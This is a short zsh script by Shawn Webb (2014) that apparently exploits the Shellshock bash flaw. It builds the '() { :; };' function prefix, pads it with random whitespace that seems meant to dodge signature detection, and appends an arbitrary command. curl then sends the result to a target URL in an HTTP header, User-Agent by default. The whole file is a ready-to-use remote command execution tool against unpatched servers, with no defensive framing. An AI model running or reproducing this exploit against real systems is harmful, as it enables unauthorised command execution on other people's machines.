#!/usr/bin/env zsh

# Copyright (c) 2014 Shawn Webb <lattera@gmail.com
# Author: Shawn Webb <lattera@gmail.com>
# License: 2-clause BSD license
#
# USAGE: ${0} -c <command> [-u <URL> [-H header]]

whitespace_sameline=$(echo " \t")

function get_whitespace() {
	str=""
	upperbound=$((${RANDOM} % 100))
	if [ ${upperbound} -eq 0 ]; then
		upperbound=1
	fi
	for ((i=1; i < ${upperbound}; i++)); do
		str="${str}${whitespace_sameline[$((${RANDOM} % ${#whitespace_sameline}))]}"
	done

	echo -n ${str}
}

function create_preface() {
str="() {$(get_whitespace)"
	str="${str}:$(get_whitespace)"
	str="${str};$(get_whitespace)"
	str="${str}}$(get_whitespace)"
	str="${str};$(get_whitespace)"

	echo -n ${str}
}

if [ ${#@} -eq 0 ]; then
	echo "USAGE: ${0} -c <command> [-u <URL> [-H header]]"
	exit 1
fi

cmd=""
url=""
header="User-Agent: "
while getopts "c:H:u:" o; do
	case "${o}" in
		c)
			cmd="$(create_preface) ${OPTARG}"
			;;
		H)
			header=${OPTARG}
			;;
		u)
			url=${OPTARG}
			;;
	esac
done

if [ ${#url} -eq 0 ]; then
	echo ${cmd}
	exit 0
fi

curl -H "${header}${cmd}" ${url}
